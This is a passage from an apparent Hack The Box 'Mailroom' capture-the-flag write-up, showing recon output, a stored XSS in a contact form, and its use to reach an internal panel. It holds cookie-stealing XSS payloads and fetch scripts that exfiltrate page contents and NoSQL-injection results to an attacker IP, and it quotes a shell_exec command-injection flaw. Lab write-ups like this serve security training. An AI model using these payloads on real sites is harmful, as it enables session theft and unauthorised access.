+</span></span><span class="line"><span class="cl">Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
+</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.4.33
+</span></span></code></pre></div><p>Looks like landing page for a shipping services company</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/landing-page.png" alt="Landing Page" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Found a reference to the domain <code>mailroom.htb</code> in the footer, adding it to <code>/etc/hosts</code>
+Potential usernames in the About Us page</p>
+<ul>
+<li>Tristan Pitt</li>
+<li>Matthew Conley</li>
+<li>Chris McLovin'</li>
+<li>Vivien Perkins</li>
+</ul>
+<p>There&rsquo;s also a contact form at <code>/contact.php</code>, which seems to be operated by an AI. Since there is a third part interacting with the data, testing it with dummy data</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/contact-page.png" alt="contact-page" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>What&rsquo;s interesting is submitting the form returns a link to view it</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/submit-contact-page.png" alt="submit-contact-page" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>The link reflects all input fields except the title; however, the <code>Inquiry status</code> heading is new.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/view-contact-form-status.png" alt="XXS test" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Since the message body is reflected, my very first thought is XSS. Using a basic XXS payload like <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> in the message field and visiting the link gives a XSS pop up.</p>
+<p>Since it is vulnerable to XXS, I tried to grab cookies, but neither of these payloads worked</p>
+<ul>
+<li><code>&lt;script&gt;document.location='http://10.10.14.35/?c='+document.cookie&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;new Image().src='http://10.10.14.35/cookie.php?c='+localStorage.getItem('token');&lt;/script&gt;</code></li>
+</ul>
+<p>Fuzzing for directories and files didn&rsquo;t uncover anything new</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://10.10.11.209/FUZZ -o ffuf_mailroom.md -of md -t <span class="m">100</span> -e .php -fs <span class="m">277</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.                       <span class="o">[</span>Status: 200, Size: 7748, Words: 2851, Lines: 129, Duration: 64ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.php               <span class="o">[</span>Status: 200, Size: 7748, Words: 2851, Lines: 129, Duration: 62ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">contact.php             <span class="o">[</span>Status: 200, Size: 4317, Words: 1297, Lines: 87, Duration: 61ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">about.php               <span class="o">[</span>Status: 200, Size: 6891, Words: 2761, Lines: 119, Duration: 59ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">services.php            <span class="o">[</span>Status: 200, Size: 4336, Words: 1307, Lines: 76, Duration: 57ms<span class="o">]</span>
+</span></span></code></pre></div><p>However, bruteforcing vhosts with wfuzz, a new virtual host was uncovered: <code>git.mailroom.htb</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; wfuzz_subdomain_enum mailroom.htb --hh <span class="m">7746</span>
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://mailroom.htb/
+</span></span><span class="line"><span class="cl">Total requests: <span class="nv">4989</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000262:   <span class="m">200</span>        <span class="m">267</span> L    <span class="m">1181</span> W     <span class="m">13089</span> Ch    <span class="s2">&#34;git&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total time: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Processed Requests: <span class="m">4989</span>
+</span></span><span class="line"><span class="cl">Filtered Requests: <span class="m">4988</span>
+</span></span><span class="line"><span class="cl">Requests/sec.: <span class="m">0</span>
+</span></span></code></pre></div><h3 id="gitea---gitmailroomhtb" class="relative group">Gitea - git.mailroom.htb <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#gitea---gitmailroomhtb" aria-label="Anchor">#</a></span></h3><p>The landing page shows Gitea&rsquo;s version is <code>1.18.0</code>, couldn&rsquo;t find any exploits for this version</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/gitea_server.png" alt="Gitea server" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>It contains a repository owned by Matthew, containing content related to what appears to be a staffroom website.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/staffroom-source-gitea.png" alt="Staffroom source code" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Based on this from <code>auth.php</code>, the website seems to be using MongoDB as the backend.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Client</span><span class="p">(</span><span class="s2">&#34;mongodb://mongodb:27017&#34;</span><span class="p">);</span> <span class="c1">// Connect to the MongoDB database
+</span></span></span></code></pre></div><p>Discovered a reference to a <a href="http://git.mailroom.htb/matthew/staffroom/src/branch/main/auth.php#L42" target="_blank" rel="noreferrer">new vhost</a>: <code>staff-review-panel.mailroom.htb</code>.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/auth_php-source.png" alt="auth.php source code" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>However, the vhost returns a 403, maybe it&rsquo;s an internal site</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -ph staff-review-panel.mailroom.htb
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">403</span> Forbidden
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">296</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">17</span> Jul <span class="m">2023</span> 09:19:29 GMT
+</span></span><span class="line"><span class="cl">Keep-Alive: <span class="nv">timeout</span><span class="o">=</span>5, <span class="nv">max</span><span class="o">=</span><span class="m">100</span>
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span></code></pre></div><p>Additionally, in the event of invalid credentials, the site simply returns some JSON data. Ideally, in PHP, there should have been an <code>exit</code> statement after this to halt the execution of the remaining code, but this is not the case here.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/invalid-credentials-response.png" alt="Invalid credentials response" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Another file in the source code, <code>inspect.php</code> also appears <a href="http://git.mailroom.htb/matthew/staffroom/src/branch/main/inspect.php#L12" target="_blank" rel="noreferrer">interesting</a>. The <code>shell_exec()</code> can potentially lead to code execution</p>
+<ul>
+<li>It accepts <code>inquiry_id</code> as a POST parameter and removes a few special characters and then passes to <code>shell_exec()</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inquiry_id&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$inquiryId</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\$&lt;&gt;;|&amp;{}\(\)\[\]\&#39;\&#34;]/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inquiry_id&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$contents</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;cat /var/www/mailroom/inquiries/</span><span class="si">$inquiryId</span><span class="s2">.html&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>Fuzzing the Gitea website, found a sitemap which could have links to some other assets.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://git.mailroom.htb/FUZZ -o ffuf_git.md -of md -t <span class="m">100</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">favicon.ico             <span class="o">[</span>Status: 301, Size: 58, Words: 3, Lines: 3, Duration: 68ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">sitemap.xml             <span class="o">[</span>Status: 200, Size: 267, Words: 4, Lines: 3, Duration: 90ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.                       <span class="o">[</span>Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 70ms<span class="o">]</span>
+</span></span></code></pre></div><p>The sitemap links to two other sitemaps for users and repositories respectively</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb git.mailroom.htb/sitemap.xml
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">    &lt;loc&gt;http://git.mailroom.htb/explore/users/sitemap-1.xml&lt;/loc&gt;
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">    &lt;loc&gt;http://git.mailroom.htb/explore/repos/sitemap-1.xml&lt;/loc&gt;
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>The user sitemap gives three usernames,</p>
+<ul>
+<li><code>administrator</code></li>
+<li><code>matthew</code></li>
+<li><code>tristan</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb git.mailroom.htb/explore/users/sitemap-1.xml
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">  &lt;url&gt;
+</span></span><span class="line"><span class="cl">    &lt;loc&gt;http://git.mailroom.htb/administrator&lt;/loc&gt;
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">    &lt;loc&gt;http://git.mailroom.htb/matthew&lt;/loc&gt;
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">    &lt;loc&gt;http://git.mailroom.htb/tristan&lt;/loc&gt;
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><hr>
+<h2 id="foothold" class="relative group">Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foothold" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="exfiltrating-data-using-xxs" class="relative group">Exfiltrating data using XXS <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exfiltrating-data-using-xxs" aria-label="Anchor">#</a></span></h3><p>Since the staff site is forbidden when accessed internally, maybe it can be accessed using the XSS vulnerability on the contact page. A payload like this works. Additionally, the data must be base64 encoded, as it is being exfiltrated as an HTTP parameter.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;http://staff-review-panel.mailroom.htb&#34;</span><span class="p">).</span><span class="nx">then</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">r</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">text</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">fetch</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sb">`http://10.10.14.35/exfil?data=</span><span class="si">${</span><span class="nx">btoa</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">unescape</span><span class="p">(</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span><span class="si">}</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span></code></pre></div><p>I developed a <a href="https://gist.github.com/AbraXa5/f8f7e0a6caec4c7a5eb6c426a575923b#file-xxs_exfil-py" target="_blank" rel="noreferrer">small Flask application</a> to automate the decoding process for each request. Using the payload returns the source for the staff review site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; python xss_exfil.py
+</span></span><span class="line"><span class="cl">2023-07-17 18:32:34,435 - INFO - Starting server on http://0.0.0.0:80, use &lt;Ctrl-C&gt; to stop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;description&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">  &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;author&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">  &lt;title&gt;Inquiry Review Panel&lt;/title&gt;
+</span></span><span class="line"><span class="cl">  &lt;!-- Favicon--&gt;
+</span></span><span class="line"><span class="cl">  &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;icon&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;image/x-icon&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;assets/favicon.ico&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">  &lt;!-- Bootstrap icons--&gt;
+</span></span><span class="line"><span class="cl">  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;font/bootstrap-icons.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">  &lt;!-- Core theme CSS <span class="o">(</span>includes Bootstrap<span class="o">)</span>--&gt;
+</span></span><span class="line"><span class="cl">  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;css/styles.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">  &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;wrapper fadeInDown&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;div <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;formContent&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      &lt;!-- Login Form --&gt;
+</span></span><span class="line"><span class="cl">      &lt;form <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;login-form&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;h2&gt;Panel Login&lt;/h2&gt;
+</span></span><span class="line"><span class="cl">        &lt;input required <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;fadeIn second&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&#34;Email&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;input required <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;password&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;password&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;fadeIn third&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;password&#34;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&#34;Password&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;fadeIn fourth&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;Log In&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;p hidden <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;message&#34;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&#34;color: #8F8F8F&#34;</span>&gt;Only show this line <span class="k">if</span> response - edit code&lt;/p&gt;
+</span></span><span class="line"><span class="cl">      &lt;/form&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      &lt;!-- Remind Passowrd --&gt;
+</span></span><span class="line"><span class="cl">      &lt;div <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;formFooter&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;a <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;underlineHover&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;register.html&#34;</span>&gt;Create an account&lt;/a&gt;
+</span></span><span class="line"><span class="cl">      &lt;/div&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    &lt;/div&gt;
+</span></span><span class="line"><span class="cl">  &lt;/div&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;!-- Bootstrap core JS--&gt;
+</span></span><span class="line"><span class="cl">  &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;js/bootstrap.bundle.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  &lt;!-- Login Form--&gt;
+</span></span><span class="line"><span class="cl">  &lt;script&gt;
+</span></span><span class="line"><span class="cl">    // Get the form element
+</span></span><span class="line"><span class="cl">    const <span class="nv">form</span> <span class="o">=</span> document.getElementById<span class="o">(</span><span class="s1">&#39;login-form&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    // Add a submit event listener to the form
+</span></span><span class="line"><span class="cl">    form.addEventListener<span class="o">(</span><span class="s1">&#39;submit&#39;</span>, <span class="nv">event</span> <span class="o">=</span>&gt; <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      // Prevent the default form submission
+</span></span><span class="line"><span class="cl">      event.preventDefault<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      // Send a POST request to the login.php script
+</span></span><span class="line"><span class="cl">      fetch<span class="o">(</span><span class="s1">&#39;/auth.php&#39;</span>, <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        method: <span class="s1">&#39;POST&#39;</span>,
+</span></span><span class="line"><span class="cl">        body: new URLSearchParams<span class="o">(</span>new FormData<span class="o">(</span>form<span class="o">))</span>,
+</span></span><span class="line"><span class="cl">        headers: <span class="o">{</span> <span class="s1">&#39;Content-Type&#39;</span>: <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="o">})</span>.then<span class="o">(</span><span class="nv">response</span> <span class="o">=</span>&gt; <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> response.json<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="o">})</span>.then<span class="o">(</span><span class="nv">data</span> <span class="o">=</span>&gt; <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        // Display the name and message in the page
+</span></span><span class="line"><span class="cl">        document.getElementById<span class="o">(</span><span class="s1">&#39;message&#39;</span><span class="o">)</span>.textContent <span class="o">=</span> data.message<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        document.getElementById<span class="o">(</span><span class="s1">&#39;password&#39;</span><span class="o">)</span>.value <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        document.getElementById<span class="o">(</span><span class="s1">&#39;message&#39;</span><span class="o">)</span>.removeAttribute<span class="o">(</span><span class="s2">&#34;hidden&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">})</span>.catch<span class="o">(</span><span class="nv">error</span> <span class="o">=</span>&gt; <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        // Display an error message
+</span></span><span class="line"><span class="cl">        //alert<span class="o">(</span><span class="s1">&#39;Error: &#39;</span> + error<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">})</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">})</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  &lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>17/Jul/2023 18:32:42<span class="o">]</span> <span class="s2">&#34;GET /exfil?data=CjwhRE9DVFlQRSBodG1sPgo8aH
+</span></span></span><span class="line"><span class="cl"><span class="s2">...snip...
+</span></span></span><span class="line"><span class="cl"><span class="s2">...snip...
+</span></span></span></code></pre></div><p>Based on this, we know</p>
+<ul>
+<li>the <code>/auth.php</code> endpoint accepts a POST request</li>
+<li>the content type is, <code>application/x-www-form-urlencoded</code></li>
+<li>this will return JSON data</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/auth.php&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">body</span><span class="o">:</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="k">new</span> <span class="nx">FormData</span><span class="p">(</span><span class="nx">form</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
+</span></span></code></pre></div><p>Investigating the new <code>/auth.php</code> endpoint based on this new info. Given that the endpoint is related to authentication and the database is MongoDB, it&rsquo;s possible that it might be susceptible to NoSQL injection.</p>
+<h3 id="exploiting-nosqli" class="relative group">Exploiting NoSQLi <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-nosqli" aria-label="Anchor">#</a></span></h3><p>Modified the previous script to conduct a test for NoSQLi. The main payload here is <code>email[$ne]=abraxas&amp;password[$ne]=abraxas</code>. Given the extremely remote possibility of an existing user with these credentials, a positive response from this query will confirm NoSQL injection.</p>
+<p><em>nosqli.js</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// var formData = &#34;email[$exists]=true&amp;password[$exists]=true&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="s2">&#34;email[$ne]=abraxas&amp;password[$ne]=abraxas&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;http://staff-review-panel.mailroom.htb/auth.php&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span> <span class="nx">formData</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Content-Type&#34;</span><span class="o">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">text</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span> <span class="c1">// Log the response content to the console
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">fetch</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sb">`http://10.10.14.35/exfil?data=</span><span class="si">${</span><span class="nx">btoa</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">unescape</span><span class="p">(</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">text</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span><span class="si">}</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Error:&#34;</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span></code></pre></div><p>Since this script is much bigger than the previous one, using <code>src</code> to upload the script via XSS, as it&rsquo;s easier to replicate the request.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pB POST mailroom.htb/contact.php <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">email</span><span class="o">=</span>abraxas@mailroom.htb <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">title</span><span class="o">=</span>Test <span class="se">\
